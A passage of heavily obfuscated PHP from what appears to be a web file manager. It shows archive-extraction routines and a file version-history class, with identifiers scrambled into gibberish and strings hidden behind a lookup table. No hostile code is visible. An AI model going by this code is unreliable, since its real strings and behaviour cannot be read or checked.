self::unzipErrorCheck($Îú¢¤îÓ, array($¼ï††ÄÏ[1221], $¤”¹ĞıÜ, $ÍÕŠ’Ş‹, $Ò—¬Ï°ñ, $­úÇƒÚ´)); Hook::trigger($¼ï††ÄÏ[1222], $±ºØìİ¤); recursion_dir($±ºØìİ¤, $¿Ñşßİ, $ ­½Ïûî, 0); $·üãµ·’ = array_merge($¿Ñşßİ, $ ­½Ïûî); $ß£äÛãÉ = array(); foreach ($·üãµ·’ as $‚ËÂİ¿) { $®À”ÂìÖ = IO::move(self::iconvApp($‚ËÂİ¿), $Ò—¬Ï°ñ, $Úí¦™‘„); if ($®À”ÂìÖ) { $ß£äÛãÉ[] = $®À”ÂìÖ; } } del_dir($±ºØìİ¤); } else { $®À”ÂìÖ = IO::move($­úÇƒÚ´[$¼ï††ÄÏ[210]], $Ò—¬Ï°ñ, $Úí¦™‘„, get_path_this($º½‡Å‡€[$¼ï††ÄÏ[32]])); if ($®À”ÂìÖ) { $ß£äÛãÉ[] = $®À”ÂìÖ; } } return $ß£äÛãÉ ? $ß£äÛãÉ : !1; } public static function unzipList($ôÀÖ’È¬) { $ÅûËº =& $_SERVER[”ú…±Ú¥]; $™¼ğ¡¶« = isset($ôÀÖ’È¬[$ÅûËº[1223]]) ? $ôÀÖ’È¬[$ÅûËº[1223]] : !1; $ğÇˆıøÕ = isset($ôÀÖ’È¬[$ÅûËº[1219]]) ? @json_decode($ôÀÖ’È¬[$ÅûËº[1219]], !0) : -1; $«¶úâà˜ = self::unzipPart($ôÀÖ’È¬[$ÅûËº[84]], $ğÇˆıøÕ); if (!$«¶úâà˜ || !IO::exist($«¶úâà˜[$ÅûËº[210]])) { show_json(LNG($ÅûËº[105]), !1); } $Â™ ñä· = $«¶úâà˜[$ÅûËº[1218]][count($«¶úâà˜[$ÅûËº[1218]]) - 1]; $¶‘Î¯”Ë = in_array(IO::ext($«¶úâà˜[$ÅûËº[210]]), array($ÅûËº[351], $ÅûËº[1224], $ÅûËº[1225], $ÅûËº[1226], $ÅûËº[1227], $ÅûËº[1228])); if (!$™¼ğ¡¶« && ($Â™ ñä·[$ÅûËº[1219]] == -1 || $¶‘Î¯”Ë)) { $’™úìÇ¤ = $«¶úâà˜[$ÅûËº[1220]] . get_path_this($«¶úâà˜[$ÅûËº[210]]) . $ÅûËº[1229]; if (!IO::exist($’™úìÇ¤)) { $ ¹ÁñÜÊ = $Â™ ñä·[$ÅûËº[1219]] == -1 ? get_path_ext(IO::pathThis($ôÀÖ’È¬[$ÅûËº[84]])) : get_path_ext($«¶úâà˜[$ÅûËº[210]]); $ÂÈëå’ = KodArchive::listContent(self::iconvSystem($«¶úâà˜[$ÅûËº[210]]), !0, $ ¹ÁñÜÊ); self::unzipErrorCheck($ÂÈëå’, array($ÅûËº[1230], $ôÀÖ’È¬, $«¶úâà˜)); @file_put_contents($’™úìÇ¤, json_encode($ÂÈëå’[$ÅûËº[1231]])); } return @json_decode(IO::getContent($’™úìÇ¤), !0); } IO::fileOut($«¶úâà˜[$ÅûËº[210]], $™¼ğ¡¶«, get_path_this($Â™ ñä·[$ÅûËº[32]])); die; } private static function zipFileList($éªÇ—°ù, $Áƒ¹ŸâÏ = false) { $Œæóó¿¿ =& $_SERVER[”ú…±Ú¥]; $¬÷Æ•ß‡ = array(); foreach ($éªÇ—°ù as $Ë™éÆ¨Ï) { $øü¤Ô¨Ÿ = $Ë™éÆ¨Ï[$Œæóó¿¿[84]]; if ($Áƒ¹ŸâÏ) { $øü¤Ô¨Ÿ = self::copy($Ë™éÆ¨Ï[$Œæóó¿¿[84]], $Áƒ¹ŸâÏ, $Œæóó¿¿[850]); } else { $à€äû’˜ = self::init($Ë™éÆ¨Ï[$Œæóó¿¿[84]]); if ($à€äû’˜->getType() == $Œæóó¿¿[106]) { $øü¤Ô¨Ÿ = $à€äû’˜->path; } } if ($øü¤Ô¨Ÿ && self::local()->exist($øü¤Ô¨Ÿ)) { $¬÷Æ•ß‡[$Ë™éÆ¨Ï[$Œæóó¿¿[84]]] = $øü¤Ô¨Ÿ; } } if (!empty($¬÷Æ•ß‡)) { return array_values($¬÷Æ•ß‡); } show_json(LNG($Œæóó¿¿[1194]), !1); } private static function localFilePath($Ş¿Ù’¾Ÿ) { $‘Ë†š„ =& $_SERVER[”ú…±Ú¥]; $à•Ò÷£è = KodIO::parse($Ş¿Ù’¾Ÿ); if ($à•Ò÷£è[$‘Ë†š„[33]] == KodIO::KOD_SOURCE) { $½©¥ê–Á = Model($‘Ë†š„[857])->fileInfoGet(KodIO::sourceID($Ş¿Ù’¾Ÿ)); if (!$½©¥ê–Á[$‘Ë†š„[84]]) { show_json($‘Ë†š„[1232], !1); } $Ş¿Ù’¾Ÿ = $½©¥ê–Á[$‘Ë†š„[84]]; } $®€¬»¾ = self::init($Ş¿Ù’¾Ÿ); if ($®€¬»¾->pathParse[$‘Ë†š„[1180]]) { $Ş¿Ù’¾Ÿ = $®€¬»¾->pathParse[$‘Ë†š„[1180]]; $®€¬»¾ = self::init($Ş¿Ù’¾Ÿ); } $ˆ‘ü®ÑË = $®€¬»¾->getType(); if ($ˆ‘ü®ÑË == $‘Ë†š„[106] || $ˆ‘ü®ÑË == $‘Ë†š„[1233]) { if (!$®€¬»¾->exist($®€¬»¾->path)) { show_json(LNG($‘Ë†š„[105]), !1); } return $®€¬»¾->path; } return !1; } public static function unzipPart($÷ËÂÎÍ, $°¿×ò›É = -1) { $á¡éÓƒ =& $_SERVER[”ú…±Ú¥]; $Ä§Í…·Ò = IO::pathThis($÷ËÂÎÍ); if (!$°¿×ò›É || $°¿×ò›É == -1) { $ö¬í—Ëø = array(array($á¡éÓƒ[32] => $Ä§Í…·Ò, $á¡éÓƒ[1219] => -1)); $ö¬í—Ëø[0][$á¡éÓƒ[1234]] = $ö¬í—Ëø[0][$á¡éÓƒ[32]]; } else { if (is_array($°¿×ò›É)) { $ö¬í—Ëø = $°¿×ò›É; $¾àõíñù = count($ö¬í—Ëø) - 1; for ($Ô‹Â·‰¸ = 0; $Ô‹Â·‰¸ <= $¾àõíñù; $Ô‹Â·‰¸++) { $±›Ò÷ = $ö¬í—Ëø[$Ô‹Â·‰¸]; $Ü‘½æê¤ = get_path_this($±›Ò÷[$á¡éÓƒ[32]]) . (checkExtSafe($±›Ò÷[$á¡éÓƒ[32]]) ? $á¡éÓƒ[12] : $á¡éÓƒ[1235]); $ö¬í—Ëø[$Ô‹Â·‰¸][$á¡éÓƒ[1234]] = $á¡éÓƒ[1236] . intval($±›Ò÷[$á¡éÓƒ[1219]]) . $á¡éÓƒ[424] . $Ü‘½æê¤; if ($Ô‹Â·‰¸ == 0) { continue; } $ö¬í—Ëø[$Ô‹Â·‰¸][$á¡éÓƒ[1234]] = $ö¬í—Ëø[$Ô‹Â·‰¸ - 1][$á¡éÓƒ[1234]] . $á¡éÓƒ[1237] . $ö¬í—Ëø[$Ô‹Â·‰¸][$á¡éÓƒ[1234]]; } } } if (!is_array($ö¬í—Ëø) || count($ö¬í—Ëø) == 0) { return !1; } $ä—ÕßµÅ = $ö¬í—Ëø[count($ö¬í—Ëø) - 1]; if (!IO::exist($÷ËÂÎÍ)) { return !1; } $õ×ìªÂº = TEMP_FILES . $á¡éÓƒ[1238] . kodIO::hashPathSafe($÷ËÂÎÍ) . $á¡éÓƒ[8]; $ïèú¤ïˆ = $õ×ìªÂº . $ä—ÕßµÅ[$á¡éÓƒ[1234]]; mk_dir($õ×ìªÂº); file_put_contents(TEMP_FILES . $á¡éÓƒ[1213], $á¡éÓƒ[12]); if (IO::exist($ïèú¤ïˆ)) { return array($á¡éÓƒ[210] => $ïèú¤ïˆ, $á¡éÓƒ[1218] => $ö¬í—Ëø, $á¡éÓƒ[1220] => $õ×ìªÂº); } $«–âÂ»‹ = self::localFilePath($÷ËÂÎÍ); if (!$«–âÂ»‹) { $«–âÂ»‹ = $õ×ìªÂº . $á¡éÓƒ[1239]; if (!IO::exist($«–âÂ»‹)) { self::copy($÷ËÂÎÍ, $õ×ìªÂº, !1, get_path_this($«–âÂ»‹)); } } if (!$«–âÂ»‹ || !IO::exist($«–âÂ»‹)) { return !1; } if ($ä—ÕßµÅ[$á¡éÓƒ[1219]] == -1) { return array($á¡éÓƒ[210] => $«–âÂ»‹, $á¡éÓƒ[1218] => $ö¬í—Ëø, $á¡éÓƒ[1220] => $õ×ìªÂº); } $£ÇÛ†ÓÅ = $«–âÂ»‹; foreach ($ö¬í—Ëø as $Ô‹Â·‰¸ => $±›Ò÷) { if (!$±›Ò÷ || $±›Ò÷[$á¡éÓƒ[1219]] == $á¡éÓƒ[1217]) { break; } if (substr($±›Ò÷[$á¡éÓƒ[32]], -1, 1) == $á¡éÓƒ[8]) { break; } $á‡ªç” = in_array(get_path_ext($±›Ò÷[$á¡éÓƒ[1234]]), array($á¡éÓƒ[351], $á¡éÓƒ[1224], $á¡éÓƒ[1225], $á¡éÓƒ[1226], $á¡éÓƒ[1227], $á¡éÓƒ[1228])); $¡œö™… = $Ô‹Â·‰¸ == count($ö¬í—Ëø) - 1 && $á‡ªç”; $ûŞÚêÊÆ = $õ×ìªÂº . $±›Ò÷[$á¡éÓƒ[1234]]; $„â€éòÓ = $õ×ìªÂº . get_path_this($±›Ò÷[$á¡éÓƒ[32]]); if (IO::exist($ûŞÚêÊÆ)) { $£ÇÛ†ÓÅ = $ûŞÚêÊÆ; continue; } $öÌ†ı¶ = $Ô‹Â·‰¸ == 0 ? get_path_ext($Ä§Í…·Ò) : get_path_ext($£ÇÛ†ÓÅ); $ØÊÅ’ßÃ = KodArchive::extract(self::iconvSystem($£ÇÛ†ÓÅ), $õ×ìªÂº, $±›Ò÷[$á¡éÓƒ[1219]], $æªÙç•¬, $öÌ†ı¶); self::unzipErrorCheck($ØÊÅ’ßÃ, array($á¡éÓƒ[1240], $÷ËÂÎÍ, $ö¬í—Ëø, $±›Ò÷, $ûŞÚêÊÆ)); if (IO::exist($„â€éòÓ)) { IO::rename($„â€éòÓ, get_path_this($ûŞÚêÊÆ)); } $£ÇÛ†ÓÅ = $ûŞÚêÊÆ; } $ïèú¤ïˆ = $£ÇÛ†ÓÅ; return array($á¡éÓƒ[210] => $£ÇÛ†ÓÅ, $á¡éÓƒ[1218] => $ö¬í—Ëø, $á¡éÓƒ[1220] => $õ×ìªÂº); } private static function unzipErrorCheck($Ü„÷ñ®á, $œÕÅ¿ù· = false) { $âĞ°ÍÍ© =& $_SERVER[”ú…±Ú¥]; if ($Ü„÷ñ®á[$âĞ°ÍÍ©[1241]]) { return !0; } write_log(array($âĞ°ÍÍ©[1242], $Ü„÷ñ®á, $œÕÅ¿ù·), $âĞ°ÍÍ©[1243]); show_json($âĞ°ÍÍ©[1244] . json_encode($Ü„÷ñ®á[$âĞ°ÍÍ©[1231]]), !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $ä×¶ Ş =& $_SERVER[”ú…±Ú¥]; $ğÌë¢Ã¨ = $GLOBALS[$ä×¶ Ş[6]][$ä×¶ Ş[89]]; if ($ğÌë¢Ã¨[$ä×¶ Ş[1245]] != 1) { return; } if ($ğÌë¢Ã¨[$ä×¶ Ş[1246]] <= 0) { return; } if (isset($_REQUEST[$ä×¶ Ş[1247]]) && $_REQUEST[$ä×¶ Ş[1247]] == $ä×¶ Ş[88]) { return; } Hook::bind($ä×¶ Ş[1248], $ä×¶ Ş[1249]); Hook::bind($ä×¶ Ş[1250], $ä×¶ Ş[1251]); Hook::bind($ä×¶ Ş[1252], $ä×¶ Ş[1253]); Hook::bind($ä×¶ Ş[1254], $ä×¶ Ş[1255]); Hook::bind($ä×¶ Ş[1256], $ä×¶ Ş[1257]); Hook::bind($ä×¶ Ş[1258], $ä×¶ Ş[1259]); } public static function eventBeforeUpload($›½±Šù) { if ($›½±Šù[3] && $›½±Šù[3] != REPEAT_REPLACE) { return; } $ØüÓ÷… = self::parsePath($›½±Šù[0]); if (!$ØüÓ÷…) { return; } self::add($ØüÓ÷…); } public static function eventBeforeEdit($Æá½è²¯) { $àÂçõñÔ = self::parsePath($Æá½è²¯[0]); if (!$àÂçõñÔ) { return; } self::add($àÂçõñÔ); } public static function eventBeforeCopyFile($ˆ°©³ˆ¨, $æ“à¾ó„, $Æı‹òÜ, $Äåëù, $§á¸ïÚä, $…ê’ºõş) { $‚ó¡¤¡ =& $_SERVER[”ú…±Ú¥]; if (isset($Æı‹òÜ->_data[$‚ó¡¤¡[1184]]) && $Æı‹òÜ->_data[$‚ó¡¤¡[1184]]) { return; } $Ş¯´Õ…¶ = $Æı‹òÜ->getPathOuter($Äåëù); $„ĞÅÃú = self::parsePath($Ş¯´Õ…¶); if (!$„ĞÅÃú) { return; } self::add($„ĞÅÃú); } public static function eventBeforeRename($úŠğ±Ù) { $¡Ÿªİ³‰ =& $_SERVER[”ú…±Ú¥]; $£ì©èŸ± = self::parsePath($úŠğ±Ù[0]); if (!$£ì©èŸ±) { return; } $ÊÀÄ¾óú = self::checkInHistory($£ì©èŸ±); if (!$ÊÀÄ¾óú) { return; } if ($ÊÀÄ¾óú[$¡Ÿªİ³‰[33]] == $¡Ÿªİ³‰[210]) { $›ÀÚÒ´§ = self::listData($£ì©èŸ±); if ($›ÀÚÒ´§ && $›ÀÚÒ´§[$¡Ÿªİ³‰[407]]) { self::moveHistory($£ì©èŸ±, $úŠğ±Ù[1]); } } else { IO::rename($ÊÀÄ¾óú[$¡Ÿªİ³‰[84]], $úŠğ±Ù[1]); } } public static function eventBeforeMove($ß”†ı‹Ş) { $ôş›ÏÇ =& $_SERVER[”ú…±Ú¥]; $ŸÛÂëğ = self::parsePath($ß”†ı‹Ş[0]); if (!$ŸÛÂëğ) { return; } $Š˜ä‹ÑÕ = self::parsePath($ß”†ı‹Ş[1]); if (!$Š˜ä‹ÑÕ) { return; } $±†š´¢ú = $ß”†ı‹Ş[3]; $ä¿Ô±ˆË = self::checkInHistory($ŸÛÂëğ); if (!$ä¿Ô±ˆË) { return; } $Ôóø¯–È = self::pathHistory($Š˜ä‹ÑÕ); if ($ä¿Ô±ˆË[$ôş›ÏÇ[33]] == $ôş›ÏÇ[210]) { $‡‘ï•Ì‘ = self::listData($ŸÛÂëğ); $È™ßø°‚ = rtrim($Š˜ä‹ÑÕ, $ôş›ÏÇ[8]) . $ôş›ÏÇ[8] . ($±†š´¢ú ? $±†š´¢ú : get_path_this($ŸÛÂëğ)); $¢õ¼ßšÃ = self::listData($È™ßø°‚); if ($‡‘ï•Ì‘ && $‡‘ï•Ì‘[$ôş›ÏÇ[407]] && $¢õ¼ßšÃ && $¢õ¼ßšÃ[$ôş›ÏÇ[407]]) { return self::clear($ŸÛÂëğ); } if ($‡‘ï•Ì‘ && $‡‘ï•Ì‘[$ôş›ÏÇ[407]]) { self::moveHistory($ŸÛÂëğ, $±†š´¢ú, $Ôóø¯–È); } } else { IO::move($ä¿Ô±ˆË[$ôş›ÏÇ[84]], $Ôóø¯–È, !1, $±†š´¢ú); self::clearEmptyFolder(IO::pathFather($ä¿Ô±ˆË[$ôş›ÏÇ[84]])); } } public static function eventAfterRemove($¨¥Œ—¥œ, $Øêò¤±±) { $ˆïŠóŒ€ =& $_SERVER[”ú…±Ú¥]; if (!$Øêò¤±±) { return; } $±÷åê‹ = self::parsePath($¨¥Œ—¥œ[0]); if (!$±÷åê‹) { return; } $œÁå†Ã² = self::checkInHistory($±÷åê‹); if (!$œÁå†Ã²) { return; } if ($œÁå†Ã²[$ˆïŠóŒ€[33]] == $ˆïŠóŒ€[210]) { $æŒÎÈÎ = self::listData($±÷åê‹, !1); if ($æŒÎÈÎ && $æŒÎÈÎ[$ˆïŠóŒ€[407]]) { self::clear($±÷åê‹, !1); } } else { IO::remove($œÁå†Ã²[$ˆïŠóŒ€[84]]); self::clearEmptyFolder(IO::pathFather($œÁå†Ã²[$ˆïŠóŒ€[84]])); } } private static function checkInHistory($ãÎ»¤×) { $ÆÑÎÊÂõ = self::pathHistory($ãÎ»¤×); if (!IO::exist($ÆÑÎÊÂõ)) { $ÆÑÎÊÂõ .= $_SERVER[”ú…±Ú¥][1260]; } return IO::exist($ÆÑÎÊÂõ) ? IO::info($ÆÑÎÊÂõ) : !1; } private static function parsePath($ç˜‚âÁò) { $šŸ…õ»‘ =& $_SERVER[”ú…±Ú¥]; if (!$ç˜‚âÁò) { return !1; } if ($GLOBALS[$šŸ…õ»‘[1261]]) { return; } $Œöˆ©Ğí = KodIO::parse($ç˜‚âÁò); $ÕöÅğ¶ = $Œöˆ©Ğí[$šŸ…õ»‘[33]]; $‰ÖºŸ’æ = !$ÕöÅğ¶ || $ÕöÅğ¶ == KodIO::KOD_IO || $ÕöÅğ¶ == KodIO::KOD_SHARE_ITEM; if (!$‰ÖºŸ’æ || !$Œöˆ©Ğí[$šŸ…õ»‘[1262]]) { return !1; } if (substr($ç˜‚âÁò, 0, strlen(DATA_PATH . $šŸ…õ»‘[1263])) == DATA_PATH . $šŸ…õ»‘[1263]) { return !1; } if ($ÕöÅğ¶ == KodIO::KOD_SHARE_ITEM) { $’»ï×ªù = IO::init($ç˜‚âÁò); if ($’»ï×ªù->pathParse[$šŸ…õ»‘[1180]]) { return self::parsePath($’»ï×ªù->pathParse[$šŸ…õ»‘[1180]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $éÙ·—à¯ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $šŸ…õ»‘[1264]); foreach ($éÙ·—à¯ as $Á–ù’Å¯) { if (!$ÕöÅğ¶ && substr($ç˜‚âÁò, 0, strlen($Á–ù’Å¯)) == $Á–ù’Å¯) { return !1; } } self::log($GLOBALS[$šŸ…õ»‘[1175]] . $šŸ…õ»‘[1265] . $ç˜‚âÁò); return $ç˜‚âÁò; } private static function pathHistory($ŒßÈè®ì) { $³ÏÇá– =& $_SERVER[”ú…±Ú¥]; $õß—ÂÜ = self::$_historyBase . ltrim(KodIO::clear($ŒßÈè®ì), $³ÏÇá–[8]); $õß—ÂÜ = str_replace(array($³ÏÇá–[1266]), array($³ÏÇá–[1267]), $õß—ÂÜ); return $õß—ÂÜ; } public static function log($€‹ÕöúÏ) { } public static function historyCount($óñ‚ã¼¿) { $üß¦­­ =& $_SERVER[”ú…±Ú¥]; $Ñ–ï²ÃÙ = array(); $ô›ÔÍÌ© = array(); foreach ($óñ‚ã¼¿ as $«¾¿šÔÇ) { $¦ÖÃ…‚æ = get_path_father($«¾¿šÔÇ); if (!$ô›ÔÍÌ©[$¦ÖÃ…‚æ]) { $ô›ÔÍÌ©[$¦ÖÃ…‚æ] = array(); } $ô›ÔÍÌ©[$¦ÖÃ…‚æ][] = get_path_this($«¾¿šÔÇ); } foreach ($ô›ÔÍÌ© as $¦ÖÃ…‚æ => $ôÁÏ´®ã) { $Øëµßçæ = self::parsePath($¦ÖÃ…‚æ); if (!$Øëµßçæ) { continue; } foreach ($ôÁÏ´®ã as $ÙŸŒ¨ÊÕ) { $Œ«Á‡·Ò = self::listData(rtrim($Øëµßçæ, $üß¦­­[8]) . $üß¦­­[8] . $ÙŸŒ¨ÊÕ, !1); if ($Œ«Á‡·Ò && $Œ«Á‡·Ò[$üß¦­­[407]]) { $Ñ–ï²ÃÙ[rtrim($¦ÖÃ…‚æ, $üß¦­­[8]) . $üß¦­­[8] . $ÙŸŒ¨ÊÕ] = count($Œ«Á‡·Ò[$üß¦­­[407]]); } } } return $Ñ–ï²ÃÙ; } public static function add($¶­ŞÒ) { $ŸËçÇ°• =& $_SERVER[”ú…±Ú¥]; $“åĞúÁÈ = self::listData($¶­ŞÒ); if (!$“åĞúÁÈ) { return; } $Ç‡£Á° = Model($ŸËçÇ°•[802])->get($ŸËçÇ°•[1268]); $«’ˆ²ŞÈ = $GLOBALS[$ŸËçÇ°•[6]][$ŸËçÇ°•[89]][$ŸËçÇ°•[1246]]; $††Éµ = $Ç‡£Á° == $ŸËçÇ°•[1269] ? min(5, $«’ˆ²ŞÈ) : $«’ˆ²ŞÈ; if ($«’ˆ²ŞÈ <= 0) { return; } $¡ §­â = IO::info($¶­ŞÒ); $‡·›·úÚ = $“åĞúÁÈ[$ŸËçÇ°•[407]]; if ($¡ §­â[$ŸËçÇ°•[76]] == 0) { return; } if ($¡ §­â[$ŸËçÇ°•[76]] >= 1024 * 1024 * 500) { return !1; } $ş†–ÌË = IO::hashSimple($¶­ŞÒ); if ($‡·›·úÚ && $‡·›·úÚ[0][$ŸËçÇ°•[177]] == $ş†–ÌË) { return !0; } if (array_key_exists($ŸËçÇ°•[213], $¡ §­â) && !$¡ §­â[$ŸËçÇ°•[213]]) { return !1; } $ïÃù§âµ = short_id(time()); $Üı˜çÀ = array($ŸËçÇ°•[437] => $ïÃù§âµ, $ŸËçÇ°•[177] => $ş†–ÌË, $ŸËçÇ°•[32] => $¡ §­â[$ŸËçÇ°•[32]] . $ŸËçÇ°•[10] . date($ŸËçÇ°•[1270]) . rand_string(1), $ŸËçÇ°•[76] => $¡ §­â[$ŸËçÇ°•[76]], $ŸËçÇ°•[492] => USER_ID, $ŸËçÇ°•[211] => time(), $ŸËçÇ°•[1271] => $ŸËçÇ°•[12]); IO::mkdir($“åĞúÁÈ[$ŸËçÇ°•[1272]]); $›şú¦’¨ = IO::copy($¶­ŞÒ, $“åĞúÁÈ[$ŸËçÇ°•[1272]], !1, $Üı˜çÀ[$ŸËçÇ°•[32]]); if (!$›şú¦’¨) { self::clearEmptyFolder($“åĞúÁÈ[$ŸËçÇ°•[1272]]); return !1; } array_unshift($‡·›·úÚ, $Üı˜çÀ); if (count($‡·›·úÚ) > $††Éµ) { $¼Â·š„¹ = array_slice($‡·›·úÚ, $††Éµ); foreach ($¼Â·š„¹ as $¯ŠÓ½) { IO::remove($“åĞúÁÈ[$ŸËçÇ°•[1272]] . $¯ŠÓ½[$ŸËçÇ°•[32]]); } $‡·›·úÚ = array_slice($‡·›·úÚ, 0, $††Éµ); } return self::saveData($“åĞúÁÈ[$ŸËçÇ°•[1273]], $‡·›·úÚ); } public static function remove($Õ‚”—ÌÅ, $ı™Ç›ï) { $©Ã”±·” =& $_SERVER[”ú…±Ú¥]; $¤æç£ã¸ = self::listData($Õ‚”—ÌÅ); $èöÁ©ß• = array(); if (!$¤æç£ã¸) { return !1; } foreach ($¤æç£ã¸[$©Ã”±·”[407]] as $ôâÂ‘ñì) { if ($ôâÂ‘ñì[$©Ã”±·”[437]] == $ı™Ç›ï) { IO::remove($¤æç£ã¸[$©Ã”±·”[1272]] . $ôâÂ‘ñì[$©Ã”±·”[32]]); continue; } $èöÁ©ß•[] = $ôâÂ‘ñì; } return self::saveData($¤æç£ã¸[$©Ã”±·”[1273]], $èöÁ©ß•); } public static function clear($–åØ×ñõ, $äÑ±Õí¦ = true) { $Çì‘øÃ³ =& $_SERVER[”ú…±Ú¥]; $ÀÛº™ÃÍ = self::listData($–åØ×ñõ, $äÑ±Õí¦); if (!$ÀÛº™ÃÍ) { return !1; } foreach ($ÀÛº™ÃÍ[$Çì‘øÃ³[407]] as $ØÒî«ï) { IO::remove($ÀÛº™ÃÍ[$Çì‘øÃ³[1272]] . $ØÒî«ï[$Çì‘øÃ³[32]]); } return self::saveData($ÀÛº™ÃÍ[$Çì‘øÃ³[1273]], array()); } public static function moveHistory($Üª¹À­ø, $‚Å¾»³– = '', $Ï–²‡Ş² = '') { $á’ƒ¡Ú =& $_SERVER[”ú…±Ú¥]; $Û‰ƒ¹ì = self::listData($Üª¹À­ø, !1); if (!$Û‰ƒ¹ì || !$Û‰ƒ¹ì[$á’ƒ¡Ú[407]]) { return !1; } $ùã¬Â¹Ö = $á’ƒ¡Ú[1260]; $‚Å¾»³– = $‚Å¾»³– ? $‚Å¾»³– : get_path_this($Üª¹À­ø); $Ï–²‡Ş² = $Ï–²‡Ş² ? $Ï–²‡Ş² : $Û‰ƒ¹ì[$á’ƒ¡Ú[1272]]; $ğğÑËÁò = substr(get_path_this($Û‰ƒ¹ì[$á’ƒ¡Ú[1273]]), 0, -strlen($ùã¬Â¹Ö)); foreach ($Û‰ƒ¹ì[$á’ƒ¡Ú[407]] as $ß´îíû => $å±¢ø­Ğ) { $Å„••ô× = $‚Å¾»³– . substr($å±¢ø­Ğ[$á’ƒ¡Ú[32]], strlen($ğğÑËÁò)); $ë÷¤èü = IO::move($Û‰ƒ¹ì[$á’ƒ¡Ú[1272]] . $å±¢ø­Ğ[$á’ƒ¡Ú[32]], $Ï–²‡Ş², !1, $Å„••ô×); if ($ë÷¤èü) { $Û‰ƒ¹ì[$á’ƒ¡Ú[407]][$ß´îíû][$á’ƒ¡Ú[32]] = $Å„••ô×; } } $Û‰ƒ¹ì[$á’ƒ¡Ú[1273]] = IO::move($Û‰ƒ¹ì[$á’ƒ¡Ú[1273]], $Ï–²‡Ş², !1, $‚Å¾»³– . $ùã¬Â¹Ö); self::saveData($Û‰ƒ¹ì[$á’ƒ¡Ú[1273]], $Û‰ƒ¹ì[$á’ƒ¡Ú[407]]); self::clearEmptyFolder($Û‰ƒ¹ì[$á’ƒ¡Ú[1272]]); } public static function rollback($ş§¾ÉÒ, $Ï®İ¥µÃ) { $Â…¹¾—Ê =& $_SERVER[”ú…±Ú¥]; $‘Á¹‘§› = self::listData($ş§¾ÉÒ); if (!$‘Á¹‘§›) { return; } $¾Øí©‘× = IO::info($ş§¾ÉÒ); foreach ($‘Á¹‘§›[$Â…¹¾—Ê[407]] as $Ì‚·ØÆ => $ùÕšä¦Ğ) { if ($ùÕšä¦Ğ[$Â…¹¾—Ê[437]] == $Ï®İ¥µÃ) { self::add($ş§¾ÉÒ); $åÀµˆÖ = $‘Á¹‘§›[$Â…¹¾—Ê[1272]] . $ùÕšä¦Ğ[$Â…¹¾—Ê[32]]; $™¦Ö÷¨Ô = IO::copy($åÀµˆÖ, IO::pathFather($ş§¾ÉÒ), REPEAT_REPLACE, $¾Øí©‘×[$Â…¹¾—Ê[32]]); if ($™¦Ö÷¨Ô) { self::remove($ş§¾ÉÒ, $Ï®İ¥µÃ); } return $™¦Ö÷¨Ô; } } return !1; } public static function setDetail($À‹ÆÊğğ, $ˆõ×•‡°, $à¬™Ôë) { $õÎ·¯ğØ =& $_SERVER[”ú…±Ú¥]; $Ôû²äËô = self::listData($À‹ÆÊğğ); if (!$Ôû²äËô) { return; } foreach ($Ôû²äËô[$õÎ·¯ğØ[407]] as $—Ú¸¨İ => $Ï¿ËÒ×) { if ($Ï¿ËÒ×[$õÎ·¯ğØ[437]] == $ˆõ×•‡°) { $Ôû²äËô[$õÎ·¯ğØ[407]][$—Ú¸¨İ][$õÎ·¯ğØ[1271]] = $à¬™Ôë; self::saveData($Ôû²äËô[$õÎ·¯ğØ[1273]], $Ôû²äËô[$õÎ·¯ğØ[407]]); return !0; } } return !1; } public static function fileInfo($ÛÁõ–¾Ê, $˜Ó÷»Ì×) { $¶¹ãö´Û =& $_SERVER[”ú…±Ú¥]; $Ü†ó­® = self::listData($ÛÁõ–¾Ê); if (!$Ü†ó­®) { show_json(LNG($¶¹ãö´Û[105]), !1); } $’ÆÔéËÒ = $¶¹ãö´Û[12]; foreach ($Ü†ó­®[$¶¹ãö´Û[407]] as $½Ò†Š®¹ => $®®¨Ã­Ä) { if ($®®¨Ã­Ä[$¶¹ãö´Û[437]] != $˜Ó÷»Ì×) { continue; } $’ÆÔéËÒ = $Ü†ó­®[$¶¹ãö´Û[1272]] . $®®¨Ã­Ä[$¶¹ãö´Û[32]]; break; } if (!$’ÆÔéËÒ) { show_json(LNG($¶¹ãö´Û[105]), !1); } return IO::info($’ÆÔéËÒ); } public static function fileOut($Ÿ™İ¡±, $‰ÑÔŞ, $ü¿×ˆİ¤ = false) { $£áíÜ¦× =& $_SERVER[”ú…±Ú¥]; $¨ú§š‡‘ = self::fileInfo($Ÿ™İ¡±, $‰ÑÔŞ); $¹ÖÃ¥ÕŞ =& $GLOBALS[$£áíÜ¦×[7]]; $ü¿×ˆİ¤ = isset($¹ÖÃ¥ÕŞ[$£áíÜ¦×[1223]]) && $¹ÖÃ¥ÕŞ[$£áíÜ¦×[1223]] == 1; if (isset($¹ÖÃ¥ÕŞ[$£áíÜ¦×[33]]) && $¹ÖÃ¥ÕŞ[$£áíÜ¦×[33]] == $£áíÜ¦×[1274]) { return IO::fileOutImage($¨ú§š‡‘[$£áíÜ¦×[84]], $¹ÖÃ¥ÕŞ[$£áíÜ¦×[1275]]); } IO::fileOut($¨ú§š‡‘[$£áíÜ¦×[84]], $ü¿×ˆİ¤, get_path_this($Ÿ™İ¡±)); } public static function listData($İ—éó–ö, $ûÂØüûÙ = true) { $Ñ‹ÅÙ÷ =& $_SERVER[”ú…±Ú¥]; if ($ûÂØüûÙ && !IO::exist($İ—éó–ö)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($İ—éó–ö, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $×îëËßË = self::pathHistory($İ—éó–ö); $¤¶›ÄµÆ = array($Ñ‹ÅÙ÷[1273] => $×îëËßË . $Ñ‹ÅÙ÷[1260], $Ñ‹ÅÙ÷[1272] => rtrim(get_path_father($×îëËßË), $Ñ‹ÅÙ÷[8]) . $Ñ‹ÅÙ÷[8], $Ñ‹ÅÙ÷[407] => array()); $Ñ€îùûò = IO::getContent($¤¶›ÄµÆ[$Ñ‹ÅÙ÷[1273]]); if ($Ñ€îùûò) { $à§¿» = json_decode($Ñ€îùûò, !0); if (is_array($à§¿»)) { $¤¶›ÄµÆ[$Ñ‹ÅÙ÷[407]] = $à§¿»; } } return $¤¶›ÄµÆ; } private static function saveData($º‚–ÒÇç, $şŸİéèÜ) { $”ª°°Ïš =& 